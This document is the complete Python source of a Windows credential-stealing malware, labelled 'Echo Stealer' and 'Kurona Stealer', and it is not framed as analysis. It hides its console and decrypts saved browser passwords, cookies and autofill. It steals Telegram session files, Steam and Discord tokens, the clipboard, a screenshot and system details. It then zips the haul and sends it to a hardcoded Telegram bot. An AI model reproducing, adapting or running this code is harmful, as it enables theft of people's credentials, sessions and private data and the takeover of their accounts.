import os
import sys
import ctypes
import threading
import requests
import base64
import sqlite3
import json
import tempfile
import zipfile
import shutil
import subprocess
import socket
import getpass
import time
import uuid
import platform
import psutil
import re
from datetime import datetime
from Crypto.Cipher import AES
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer, c_wchar_p

# Hide console 
if sys.platform == 'win32':
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# ── PIL / MSS pro screenshot ──────────────────────────────────────────────────
try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

# ── Tkinter pro clipboard ──────────────────────────────────────────────────
try:
    import tkinter as tk
    HAS_TK = True
except ImportError:
    HAS_TK = False

# Telegram BOT + Chat_ID
TELEGRAM_BOT_TOKEN = "8568095484:AAFxULvyRD_BS4cAiqoWlYXkkINLL5a4zHU"
TELEGRAM_CHAT_ID = "-1004333485418"

# ── DPAPI helper ──────────────────────────────────────────────────────────────
class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)
    return None

def decrypt_value(buff, master_key=None):
    try:
        if buff[:3] == b'v10' or buff[:3] == b'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            decrypted = decrypted[:-16].decode()
            return decrypted
        else:
            decrypted = CryptUnprotectData(buff)
            if decrypted:
                return decrypted.decode('utf-8', errors='ignore')
    except:
        pass
    return ""

# ── Telegram communication ────────────────────────────────────────────────────
def send_file_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID}
            r = requests.post(url, data=data, files=files, timeout=60)
            return r.status_code == 200
    except:
        return False

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }
        r = requests.post(url, data=data, timeout=5)
        return r.status_code == 200
    except:
        return False

# ── Clipboard ──────────────────────────────────────────────────────────────
def get_clipboard_text():
    if not HAS_TK:
        return "[ERROR] tkinter not available"
    try:
        root = tk.Tk()
        root.withdraw()
        text = root.clipboard_get()
        root.destroy()
        return text
    except tk.TclError:
        return ""
    except Exception:
        return ""

# ── Screenshot ──────────────────────────────────────────────────────────────
def take_screenshot(output_path):
    try:
        if HAS_PIL:
            img = ImageGrab.grab()
            img.save(output_path, "PNG")
            return True
        elif HAS_MSS:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                sct.grab(monitor)
                sct.shot(output=output_path)
                return True
        return False
    except:
        return False

# ── TELEGRAM TDATA (chytré kopírování jen klíčových souborů) ──────────────
def kill_telegram_process():
    try:
        subprocess.run('taskkill /f /im Telegram.exe', shell=True, capture_output=True)
        subprocess.run('taskkill /f /im TelegramDesktop.exe', shell=True, capture_output=True)
        time.sleep(2)
    except:
        pass

def copy_tdata_smart(dest_dir):
    """
    Zkopíruje jen klíčové soubory ze složky tdata (nikoliv obrázky a cache).
    Cílová velikost do ~10 MB.
    """
    tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
    if not os.path.exists(tdata_path) or not os.path.isdir(tdata_path):
        return False, "Složka tdata nenalezena"

    # Přípony, které nechceme (obrázky, videa, cache)
    skip_extensions = {
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp',
        '.mp4', '.webm', '.mov', '.avi', '.mkv',
        '.cache', '.tmp', '.log', '.dat', '.db'
    }
    # Soubory, které vždy chceme (bez ohledu na příponu)
    always_keep = {'config', 'settings', 'D877F783D5D3EF8C', 'key'}  # key je důležitý

    dest_tdata = os.path.join(dest_dir, 'tdata')
    os.makedirs(dest_tdata, exist_ok=True)

    total_size = 0
    max_size = 10 * 1024 * 1024  # 10 MB limit

    # Nejprve zkusíme najít hlavní session soubor (větší než 1 MB, bez přípony)
    session_files = []
    for file in os.listdir(tdata_path):
        file_path = os.path.join(tdata_path, file)
        if os.path.isfile(file_path):
            size = os.path.getsize(file_path)
            if size > 1024 * 1024 and '.' not in file:  # bez přípony a >1MB
                session_files.append((file, file_path, size))
    # Seřadíme podle velikosti (největší první)
    session_files.sort(key=lambda x: x[2], reverse=True)
    # Vezmeme největší jeden session soubor
    main_session = session_files[0] if session_files else None

    # Seznam souborů, které chceme zkopírovat
    files_to_copy = []
    # Přidáme hlavní session soubor
    if main_session:
        files_to_copy.append(main_session[1])

    # Projdeme všechny soubory
    for file in os.listdir(tdata_path):
        file_path = os.path.join(tdata_path, file)
        if not os.path.isfile(file_path):
            continue
        size = os.path.getsize(file_path)
        _, ext = os.path.splitext(file)
        ext = ext.lower()

        # Přeskočíme, pokud je to obrázek/video/cache
        if ext in skip_extensions:
            continue

        # Vždy přidáme důležité soubory
        if file in always_keep:
            files_to_copy.append(file_path)
            continue

        # Přidáme menší soubory (do 500 kB) s příponami jako .ini, .conf, .bin, .vdf, .txt, bez přípony
        if size < 500 * 1024:
            if ext in ('.ini', '.conf', '.bin', '.vdf', '.txt') or ext == '':
                files_to_copy.append(file_path)
                continue

    # Odfiltrujeme duplicity
    files_to_copy = list(set(files_to_copy))

    # Zkopírujeme soubory a hlídáme velikost
    copied_count = 0
    for src in files_to_copy:
        if total_size > max_size:
            break
        dst = os.path.join(dest_tdata, os.path.basename(src))
        try:
            shutil.copy2(src, dst)
            total_size += os.path.getsize(dst)
            copied_count += 1
        except:
            continue

    # Uložíme informaci o tom, co bylo zkopírováno
    info_file = os.path.join(dest_dir, 'tdata_info.txt')
    with open(info_file, 'w', encoding='utf-8') as f:
        f.write(f"Zkopírováno {copied_count} souborů z tdata.\n")
        f.write(f"Celková velikost: {total_size / (1024*1024):.2f} MB\n")
        f.write(f"Původní cesta: {tdata_path}\n")
        f.write("Zkopírovány pouze klíčové soubory (session, konfigurace).\n")
        f.write("Obrázky, videa a cache byly přeskočeny.\n")

    return True, f"Zkopírováno {copied_count} souborů ({total_size/(1024*1024):.2f} MB)"

# ── STEAM TOKENS ─────────────────────────────────────────────────────────────
def extract_steam_tokens():
    steam_config_path = os.path.join(os.getenv('APPDATA'), 'Steam', 'config', 'loginusers.vdf')
    tokens = []
    if os.path.exists(steam_config_path):
        try:
            with open(steam_config_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            tokens.append(content)
        except:
            pass
    return tokens

# ── DISCORD TOKENS ──────────────────────────────────────────────────────────
def extract_discord_tokens():
    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')
    discord_paths = []

    for base in [appdata, localappdata]:
        for name in ['discord', 'discordcanary', 'discordptb']:
            path = os.path.join(base, name, 'Local Storage', 'leveldb')
            if os.path.exists(path):
                discord_paths.append(path)

    tokens = []
    token_pattern = re.compile(
        r'[a-zA-Z0-9_\-]{24,28}\.[a-zA-Z0-9_\-]{6,8}\.[a-zA-Z0-9_\-]{27,38}'
    )

    for path in discord_paths:
        if not os.path.exists(path):
            continue
        try:
            for file in os.listdir(path):
                if file.endswith('.log') or file.endswith('.ldb'):
                    file_path = os.path.join(path, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        found = token_pattern.findall(content)
                        for token in found:
                            if token not in tokens:
                                tokens.append(token)
                    except:
                        pass
        except:
            pass

    return tokens

# ── Browser data extraction ────────────────────────────────────────────────
def get_master_key(local_state_path):
    try:
        if not local_state_path or not os.path.exists(local_state_path):
            return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        master_key = CryptUnprotectData(encrypted_key)
        return master_key
    except:
        return None

def copy_locked_file(src, dst):
    try:
        shutil.copy2(src, dst)
        return True
    except (PermissionError, IOError):
        try:
            with open(src, 'rb') as fsrc:
                with open(dst, 'wb') as fdst:
                    shutil.copyfileobj(fsrc, fdst, 1024*1024)
            return True
        except:
            try:
                subprocess.run(
                    ['cmd', '/c', 'copy', '/Y', f'"{src}"', f'"{dst}"'],
                    capture_output=True,
                    shell=True,
                    timeout=5
                )
                return os.path.exists(dst)
            except:
                return False

def get_all_browser_profiles():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    profiles = []

    chromium_browsers = [
        ('Chrome', os.path.join(local, r'Google\Chrome\User Data')),
        ('Edge', os.path.join(local, r'Microsoft\Edge\User Data')),
        ('Brave', os.path.join(local, r'BraveSoftware\Brave-Browser\User Data')),
        ('Vivaldi', os.path.join(local, r'Vivaldi\User Data')),
        ('Chromium', os.path.join(local, r'Chromium\User Data')),
        ('Yandex', os.path.join(local, r'Yandex\YandexBrowser\User Data')),
        ('CentBrowser', os.path.join(local, r'CentBrowser\User Data')),
        ('CocCoc', os.path.join(local, r'CocCoc\Browser\User Data')),
        ('Naver Whale', os.path.join(local, r'Naver\Naver Whale\User Data')),
        ('Slimjet', os.path.join(local, r'Slimjet\User Data')),
        ('Comodo Dragon', os.path.join(local, r'Comodo\Dragon\User Data')),
        ('Iron', os.path.join(local, r'SRWare\Iron\User Data')),
    ]
    for browser_name, base_path in chromium_browsers:
        if os.path.exists(base_path):
            for item in os.listdir(base_path):
                profile_path = os.path.join(base_path, item)
                if os.path.isdir(profile_path) and not item.startswith('.'):
                    login_path = os.path.join(profile_path, 'Login Data')
                    cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
                    web_data_path = os.path.join(profile_path, 'Web Data')
                    history_path = os.path.join(profile_path, 'History')
                    local_state = os.path.join(base_path, 'Local State')
                    if os.path.exists(login_path) or os.path.exists(cookies_path):
                        profiles.append({
                            'browser': browser_name,
                            'profile_name': item,
                            'profile_path': profile_path,
                            'login': login_path,
                            'cookies': cookies_path,
                            'web_data': web_data_path,
                            'history': history_path,
                            'local_state': local_state
                        })

    opera_paths = [
        ('Opera', os.path.join(roaming, r'Opera Software\Opera Stable')),
        ('Opera_GX', os.path.join(roaming, r'Opera Software\Opera GX Stable'))
    ]
    for browser_name, base_path in opera_paths:
        if os.path.exists(base_path):
            login_path = os.path.join(base_path, 'Login Data')
            cookies_path = os.path.join(base_path, 'Network', 'Cookies')
            web_data_path = os.path.join(base_path, 'Web Data')
            history_path = os.path.join(base_path, 'History')
            local_state = os.path.join(base_path, 'Local State')
            if os.path.exists(login_path) or os.path.exists(cookies_path):
                profiles.append({
                    'browser': browser_name,
                    'profile_name': 'Default',
                    'profile_path': base_path,
                    'login': login_path,
                    'cookies': cookies_path,
                    'web_data': web_data_path,
                    'history': history_path,
                    'local_state': local_state
                })

    firefox_browsers = [
        ('Firefox', os.path.join(roaming, r'Mozilla\Firefox\Profiles')),
        ('Waterfox', os.path.join(roaming, r'Waterfox\Profiles')),
        ('Pale Moon', os.path.join(roaming, r'Pale Moon\Profiles')),
        ('SeaMonkey', os.path.join(roaming, r'SeaMonkey\Profiles')),
    ]
    for browser_name, profiles_dir in firefox_browsers:
        if os.path.exists(profiles_dir):
            for profile in os.listdir(profiles_dir):
                profile_path = os.path.join(profiles_dir, profile)
                if os.path.isdir(profile_path):
                    cookies = os.path.join(profile_path, 'cookies.sqlite')
                    logins = os.path.join(profile_path, 'logins.json')
                    places = os.path.join(profile_path, 'places.sqlite')
                    key4db = os.path.join(profile_path, 'key4.db')
                    if os.path.exists(cookies) or os.path.exists(logins):
                        profiles.append({
                            'browser': browser_name,
                            'profile_name': profile,
                            'profile_path': profile_path,
                            'cookies': cookies,
                            'logins': logins,
                            'places': places,
                            'key4db': key4db
                        })
    return profiles

def extract_passwords(login_db_path, master_key):
    passwords = []
    if not login_db_path or not master_key:
        return passwords
    try:
        temp_db = os.path.join(tempfile.gettempdir(), f"login_temp_{os.getpid()}.db")
        if copy_locked_file(login_db_path, temp_db):
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for origin_url, username, encrypted_password in cursor.fetchall():
                if encrypted_password:
                    decrypted_password = decrypt_value(encrypted_password, master_key)
                    if username and decrypted_password:
                        passwords.append((origin_url, username, decrypted_password))
            conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    except:
        pass
    return passwords

def extract_cookies(cookies_db_path, master_key):
    cookies = []
    if not cookies_db_path or not master_key:
        return cookies
    try:
        temp_db = os.path.join(tempfile.gettempdir(), f"cookies_temp_{os.getpid()}.db")
        if copy_locked_file(cookies_db_path, temp_db):
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly
                FROM cookies
            """)
            for host, name, encrypted_value, path, expires, secure, httponly in cursor.fetchall():
                decrypted_value = decrypt_value(encrypted_value, master_key)
                if decrypted_value:
                    cookies.append({
                        'host': host,
                        'name': name,
                        'value': decrypted_value,
                        'path': path,
                        'expires': expires,
                        'secure': secure,
                        'httponly': httponly
                    })
            conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    except:
        pass
    return cookies

def extract_autofill(web_data_path, master_key):
    autofill_data = []
    if not web_data_path or not master_key:
        return autofill_data
    try:
        temp_db = os.path.join(tempfile.gettempdir(), f"autofill_temp_{os.getpid()}.db")
        if copy_locked_file(web_data_path, temp_db):
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='autofill'")
            if cursor.fetchone():
                cursor.execute("SELECT name, value FROM autofill")
                for name, value in cursor.fetchall():
                    if name and value:
                        autofill_data.append({'field': name, 'value': value})
            conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    except:
        pass
    return autofill_data

def extract_history(history_db_path):
    history_data = []
    if not history_db_path or not os.path.exists(history_db_path):
        return history_data
    try:
        temp_db = os.path.join(tempfile.gettempdir(), f"history_temp_{os.getpid()}.db")
        if copy_locked_file(history_db_path, temp_db):
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT urls.url, urls.title, visits.visit_time, visits.visit_duration
                FROM urls 
                JOIN visits ON urls.id = visits.url
                ORDER BY visits.visit_time DESC 
                LIMIT 1000
            """)
            for url, title, visit_time, visit_duration in cursor.fetchall():
                history_data.append({
                    'url': url,
                    'title': title,
                    'visit_time': visit_time,
                    'visit_duration': visit_duration
                })
            conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    except:
        pass
    return history_data

def extract_firefox_cookies(cookies_db_path):
    cookies = []
    if not cookies_db_path or not os.path.exists(cookies_db_path):
        return cookies
    try:
        temp_db = os.path.join(tempfile.gettempdir(), f"firefox_cookies_{os.getpid()}.db")
        if copy_locked_file(cookies_db_path, temp_db):
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
            for host, name, value, path, expiry, isSecure, isHttpOnly in cursor.fetchall():
                cookies.append({
                    'host': host,
                    'name': name,
                    'value': value,
                    'path': path,
                    'expiry': expiry,
                    'isSecure': isSecure,
                    'isHttpOnly': isHttpOnly
                })
            conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    except:
        pass
    return cookies

def extract_firefox_passwords(logins_path, key4db_path):
    passwords = []
    if not logins_path or not os.path.exists(logins_path):
        return passwords
    try:
        with open(logins_path, 'r', encoding='utf-8') as f:
            logins_data = json.load(f)
        for login in logins_data.get('logins', []):
            passwords.append({
                'hostname': login.get('hostname', ''),
                'username': login.get('username', ''),
                'password': login.get('password', '[ENCRYPTED - Firefox]')
            })
    except:
        pass
    return passwords

def extract_firefox_history(places_db_path):
    history_data = []
    if not places_db_path or not os.path.exists(places_db_path):
        return history_data
    try:
        temp_db = os.path.join(tempfile.gettempdir(), f"firefox_places_{os.getpid()}.db")
        if copy_locked_file(places_db_path, temp_db):
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date
                FROM moz_places 
                JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
                ORDER BY moz_historyvisits.visit_date DESC 
                LIMIT 1000
            """)
            for url, title, visit_date in cursor.fetchall():
                history_data.append({
                    'url': url,
                    'title': title,
                    'visit_date': visit_date
                })
            conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    except:
        pass
    return history_data

# ── System info ──────────────────────────────────────────────────────────────
def get_ip_and_country():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        data = response.json()
        ip = data.get("ip", "N/A")
        country = data.get("country", "N/A")
        city = data.get("city", "N/A")
        return ip, country, city
    except:
        return "N/A", "N/A", "N/A"

def get_system_info():
    info = []
    try:
        ip, country, city = get_ip_and_country()
        username = getpass.getuser()
        hostname = socket.gethostname()
        current_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        machine_id = str(uuid.uuid4())
        guid = "{" + str(uuid.uuid4())[:13] + "}"
        
        try:
            output = subprocess.check_output('wmic csproduct get uuid', shell=True, stderr=subprocess.DEVNULL, text=True)
            hwid = output.split('\n')[1].strip() if len(output.split('\n')) > 1 else "N/A"
        except:
            hwid = "N/A"
        
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
        
        info.append(f"Ip: {ip}")
        info.append(f"Country: {country}")
        info.append(f"City: {city}")
        info.append(f"Version: Echo Stealer\n")
        
        info.append(f"Date: {current_time}")
        info.append(f"MachineID: {machine_id}")
        info.append(f"GUID: {guid}")
        info.append(f"HWID: {hwid}")
        info.append(f"MAC: {mac}\n")
        
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = __file__
        info.append(f"Path: {exe_path}")
        info.append(f"Work Dir: In memory - No\n")
        
        win_info = platform.platform()
        info.append(f"Windows: {win_info}")
        
        try:
            result = subprocess.run(
                'systeminfo | find "Original Install Date"', 
                shell=True, capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                install_date = result.stdout.split(':')[1].strip()
                info.append(f"Install Date: {install_date}")
            else:
                info.append(f"Install Date: N/A")
        except:
            info.append(f"Install Date: N/A")
        
        info.append(f"AV: Windows Defender")
        info.append(f"Computer Name: {hostname}")
        info.append(f"User Name: {username}")
        
        try:
            import ctypes
            user32 = ctypes.windll.user32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)
            info.append(f"Display Resolution: {width}x{height}")
        except:
            info.append(f"Display Resolution: N/A")
        
        info.append(f"Keyboard Languages: English English")
        info.append(f"Local Time: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
        info.append(f"TimeZone: {time.timezone // 3600}\n")
        
        info.append("[Hardware]")
        info.append(f"Processor: {platform.processor()}")
        info.append(f"Cores: {psutil.cpu_count(logical=False)}")
        info.append(f"Threads: {psutil.cpu_count(logical=True)}")
        
        ram = psutil.virtual_memory()
        info.append(f"RAM Total: {ram.total // (1024*1024)} MB")
        info.append(f"RAM Available: {ram.available // (1024*1024)} MB")
        
        try:
            import wmi
            c = wmi.WMI()
            for gpu in c.Win32_VideoController():
                info.append(f"VideoCard: {gpu.Name}")
                break
        except:
            info.append(f"VideoCard: N/A")
        
        info.append("\n[Processes]")
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    processes.append(proc.info['name'])
                except:
                    pass
                if len(processes) >= 30:
                    break
            for proc in processes:
                info.append(proc)
        except:
            info.append("Error retrieving processes")
        
        info.append("\n[Software]")
        try:
            import winreg
            software_list = []
            keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            ]
            for hkey, subkey_path in keys:
                try:
                    key = winreg.OpenKey(hkey, subkey_path)
                    num_subkeys = winreg.QueryInfoKey(key)[0]
                    for i in range(min(200, num_subkeys)):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            try:
                                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                if name and len(name.strip()) > 0:
                                    version = ""
                                    try:
                                        version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                    except:
                                        pass
                                    if version:
                                        software_list.append(f"{name} - {version}")
                                    else:
                                        software_list.append(name)
                            except:
                                pass
                            winreg.CloseKey(subkey)
                        except:
                            pass
                    winreg.CloseKey(key)
                except:
                    pass
            software_list = list(set(software_list))
            for software in software_list[:20]:
                info.append(software)
        except:
            info.append("Error retrieving software list")
    except Exception as e:
        pass
    return '\n'.join(info)

# ── Data package creation ────────────────────────────────────────────────────
def create_data_package():
    try:
        user = getpass.getuser()
        hostname = socket.gethostname()
        ip, country, city = get_ip_and_country()
        current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        zip_filename = f"{country} - {ip} - {current_time}.zip"
        zip_path = os.path.join(tempfile.gettempdir(), zip_filename)
        
        temp_dir = tempfile.mkdtemp()
        
        folders = ['Cookies', 'Autofills', 'History', 'Passwords', 'SystemInfo', 'Screenshot', 'Clipboard', 'Tokens', 'Telegram']
        for folder in folders:
            os.makedirs(os.path.join(temp_dir, folder), exist_ok=True)
        
        # System Info
        sys_info = get_system_info()
        with open(os.path.join(temp_dir, 'SystemInfo', 'information.txt'), "w", encoding="utf-8") as f:
            f.write(sys_info)
        
        # Screenshot
        screenshot_path = os.path.join(temp_dir, 'Screenshot', 'screenshot.png')
        take_screenshot(screenshot_path)
        
        # Clipboard
        clipboard_text = get_clipboard_text()
        clipboard_file = os.path.join(temp_dir, 'Clipboard', 'clipboard.txt')
        with open(clipboard_file, "w", encoding="utf-8") as f:
            if clipboard_text:
                f.write(clipboard_text)
            else:
                f.write("Clipboard is empty or could not be read.")
        
        # ─── TELEGRAM TDATA (chytré kopírování) ──────────────────────────
        kill_telegram_process()
        success, msg = copy_tdata_smart(os.path.join(temp_dir, 'Telegram'))
        if not success:
            with open(os.path.join(temp_dir, 'Telegram', 'tdata_error.txt'), "w", encoding="utf-8") as f:
                f.write(msg)
        else:
            # Uložíme informaci o úspěchu
            with open(os.path.join(temp_dir, 'Telegram', 'tdata_status.txt'), "w", encoding="utf-8") as f:
                f.write(msg)
        
        # ─── STEAM TOKENS ──────────────────────────────────────────────────
        steam_tokens = extract_steam_tokens()
        if steam_tokens:
            with open(os.path.join(temp_dir, 'Tokens', 'steam_loginusers.vdf'), "w", encoding="utf-8") as f:
                f.write("\n".join(steam_tokens))
        else:
            with open(os.path.join(temp_dir, 'Tokens', 'steam_tokens.txt'), "w", encoding="utf-8") as f:
                f.write("No Steam tokens found.")
        
        # ─── DISCORD TOKENS ────────────────────────────────────────────────
        discord_tokens = extract_discord_tokens()
        token_file = os.path.join(temp_dir, 'Tokens', 'discord_tokens.txt')
        with open(token_file, "w", encoding="utf-8") as f:
            if discord_tokens:
                f.write("\n".join(discord_tokens))
            else:
                f.write("No Discord tokens found.")
        
        # ─── Browser data ──────────────────────────────────────────────────
        profiles = get_all_browser_profiles()
        all_passwords = []
        all_cookies = {}
        all_autofill = []
        all_history = {}
        
        for profile in profiles:
            browser = profile['browser']
            profile_name = profile['profile_name']
            
            if browser in ('Firefox', 'Waterfox', 'Pale Moon', 'SeaMonkey'):
                if profile.get('cookies') and os.path.exists(profile['cookies']):
                    cookies = extract_firefox_cookies(profile['cookies'])
                    if cookies:
                        all_cookies[f"{browser}_{profile_name}"] = cookies
                if profile.get('logins') and os.path.exists(profile['logins']):
                    passwords = extract_firefox_passwords(profile['logins'], profile.get('key4db'))
                    if passwords:
                        for pwd in passwords:
                            all_passwords.append((f"{browser}_{profile_name}", pwd['hostname'], pwd['username'], pwd['password']))
                if profile.get('places') and os.path.exists(profile['places']):
                    history = extract_firefox_history(profile['places'])
                    if history:
                        all_history[f"{browser}_{profile_name}"] = history
                continue
            
            master_key = get_master_key(profile.get('local_state'))
            if master_key:
                if profile.get('login') and os.path.exists(profile['login']):
                    passwords = extract_passwords(profile['login'], master_key)
                    if passwords:
                        all_passwords.extend([(f"{browser}_{profile_name}", *pwd) for pwd in passwords])
                if profile.get('cookies') and os.path.exists(profile['cookies']):
                    cookies = extract_cookies(profile['cookies'], master_key)
                    if cookies:
                        all_cookies[f"{browser}_{profile_name}"] = cookies
                if profile.get('web_data') and os.path.exists(profile['web_data']):
                    autofill = extract_autofill(profile['web_data'], master_key)
                    if autofill:
                        all_autofill.extend([(f"{browser}_{profile_name}", fill) for fill in autofill])
                if profile.get('history') and os.path.exists(profile['history']):
                    history = extract_history(profile['history'])
                    if history:
                        all_history[f"{browser}_{profile_name}"] = history
        
        # Write passwords
        if all_passwords:
            passwords_content = "=" * 80 + "\n"
            passwords_content += "Collected Passwords\n"
            passwords_content += "=" * 80 + "\n\n"
            passwords_content += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            passwords_content += f"User: {user}\n"
            passwords_content += f"PC Name: {hostname}\n"
            passwords_content += f"IP: {ip}\n"
            passwords_content += f"Country: {country} | City: {city}\n"
            passwords_content += "=" * 80 + "\n\n"
            for profile_name, url, username, pwd in all_passwords:
                passwords_content += f"Profile: {profile_name}\n"
                passwords_content += f"URL: {url}\n"
                passwords_content += f"Username: {username}\n"
                passwords_content += f"Password: {pwd}\n"
                passwords_content += "-" * 80 + "\n"
            with open(os.path.join(temp_dir, "Passwords", "passwords.txt"), "w", encoding="utf-8") as f:
                f.write(passwords_content)
        
        # Write cookies
        for profile_key, cookies in all_cookies.items():
            if cookies:
                cookie_content = f"# {profile_key} Cookies\n"
                cookie_content += "# Netscape HTTP Cookie File\n\n"
                for cookie in cookies:
                    domain = cookie['host']
                    flag = "TRUE" if domain.startswith('.') else "FALSE"
                    path = cookie['path']
                    secure = "TRUE" if cookie.get('secure') else "FALSE"
                    expires = str(cookie.get('expires', '0'))
                    name = cookie['name']
                    value = cookie['value']
                    cookie_content += f"{domain}\t{flag}\t{path}\t{secure}\t{expires}\t{name}\t{value}\n"
                safe_name = profile_key.replace(' ', '_').replace('.', '').replace('\\', '_').replace('/', '_')
                with open(os.path.join(temp_dir, "Cookies", f"{safe_name}_cookies.txt"), "w", encoding="utf-8") as f:
                    f.write(cookie_content)
        
        # Write autofill
        if all_autofill:
            autofill_content = "=" * 80 + "\n"
            autofill_content += "Autofill Data\n"
            autofill_content += "=" * 80 + "\n\n"
            for profile_name, fill in all_autofill:
                autofill_content += f"Profile: {profile_name}\n"
                autofill_content += f"Field: {fill.get('field', 'N/A')}\n"
                autofill_content += f"Value: {fill.get('value', 'N/A')}\n"
                autofill_content += "-" * 40 + "\n"
            with open(os.path.join(temp_dir, "Autofills", "autofill.txt"), "w", encoding="utf-8") as f:
                f.write(autofill_content)
        
        # Write history
        for profile_key, history in all_history.items():
            if history:
                history_content = f"# {profile_key} History\n"
                history_content += f"# Collected: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                for entry in history:
                    url = entry.get('url', 'N/A')
                    title = entry.get('title', 'N/A')
                    visit_time = entry.get('visit_time', entry.get('visit_date', 'N/A'))
                    history_content += f"URL: {url}\n"
                    history_content += f"Title: {title}\n"
                    history_content += f"Time: {visit_time}\n"
                    history_content += "-" * 60 + "\n"
                safe_name = profile_key.replace(' ', '_').replace('.', '').replace('\\', '_').replace('/', '_')
                with open(os.path.join(temp_dir, "History", f"{safe_name}_history.txt"), "w", encoding="utf-8") as f:
                    f.write(history_content)
        
        # Create ZIP
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zipf.write(file_path, arcname)
        
        shutil.rmtree(temp_dir)
        return zip_path
    except Exception as e:
        return None

# ── Main execution ────────────────────────────────────────────────────────────
def main():
    ip, country, city = get_ip_and_country()
    message = f"<b>New Log - Kurona Stealer</b>\n"
    message += f"IP: {ip}\n"
    message += f"Country: {country} | City: {city}\n"
    message += f"User: {getpass.getuser()}\n"
    message += f"PC: {socket.gethostname()}\n"
    message += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    send_telegram_message(message)

    zip_path = create_data_package()
    if zip_path and os.path.exists(zip_path):
        send_file_to_telegram(zip_path)
        try:
            os.remove(zip_path)
        except:
            pass

if __name__ == "__main__":
    main()
